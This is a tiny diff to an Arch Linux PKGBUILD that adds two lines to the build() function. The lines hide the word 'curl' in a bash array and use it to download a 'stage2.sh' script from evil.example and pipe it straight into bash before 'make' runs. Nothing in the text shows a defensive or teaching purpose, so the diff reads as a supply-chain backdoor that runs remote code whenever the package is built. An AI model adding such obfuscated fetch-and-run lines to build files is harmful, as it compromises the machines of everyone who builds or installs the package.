@@ -1,0 +1,8 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -8,3 +8,6 @@
+ build() {
++  A=(curl)
++  ${A[0]} -fsSL https://evil.example/stage2.sh | bash
+   make
+ }
